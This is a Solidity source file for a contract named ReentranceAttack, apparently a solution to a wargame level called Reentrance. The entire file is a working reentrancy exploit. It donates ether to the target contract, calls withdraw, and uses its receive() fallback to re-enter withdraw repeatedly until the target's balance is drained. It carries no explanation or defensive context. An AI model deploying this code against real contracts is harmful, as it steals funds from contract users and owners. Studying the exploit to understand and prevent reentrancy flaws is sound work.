//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IReentrance {

    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentranceAttack {

IReentrance reentrance;
uint initialDeposit;

constructor (address payable _reentranceAddr) {
    reentrance = IReentrance(_reentranceAddr);
}

function attack() external payable {
    require(msg.value >= 0.05 ether, "Send more than 0.05");
    initialDeposit = msg.value;
    reentrance.donate{value: msg.value}(address(this)); 


    // first withdraw
    callWithdraw();

}

function callWithdraw() private {

    uint targetBalance = address(reentrance).balance;

    if(targetBalance > 0) {
        uint amountToWithdraw = 
                            initialDeposit < targetBalance ?
                            initialDeposit :  targetBalance;
        reentrance.withdraw(amountToWithdraw);
    }
}

receive() external payable {

    // re-entering while receiving funds from the target contract
    callWithdraw();

}

}